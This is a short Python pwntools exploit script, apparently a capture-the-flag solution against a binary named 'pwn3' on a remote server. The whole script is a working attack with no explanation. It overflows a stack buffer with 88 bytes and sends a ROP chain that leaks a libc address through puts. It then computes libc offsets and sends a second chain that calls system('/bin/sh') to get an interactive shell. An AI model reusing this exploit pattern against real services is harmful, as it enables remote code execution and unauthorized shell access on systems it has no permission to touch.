from pwn import *



puts_plt=0x00000000004005d0
fflush_got=0x0000000000601040
pop_rdi=0x0000000000400883
hello=0x0000000000400767
system_plt=0x4005e0
pop_rsi=0x0000000000400881
pop_rbp=0x00000000004006c0
ret=0x00000000004005b1
#p=process("./pwn3")
p=remote("34.251.66.45",13373)
payload=""
payload+="A"*88
payload+=p64(pop_rdi)
payload+=p64(fflush_got)
payload+=p64(puts_plt)
payload+=p64(hello)

p.sendline(payload)
p.recvuntil(":(")
data=p.recvuntil("ere:")[2:-40]
leak=u64(data.ljust(8,"\x00"))
print hex(leak)

base=leak-0x07e7e0

system=base+0x04f440
bin_sh=base+0x1b3e9a
print "leak :",hex(leak)
print "base :",hex(base)
print "system :",hex(system)
print "bin sh :",hex(bin_sh)
payload=""
payload+="A"*88
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(bin_sh)
payload+=p64(system)


p.sendline(payload)

p.interactive()
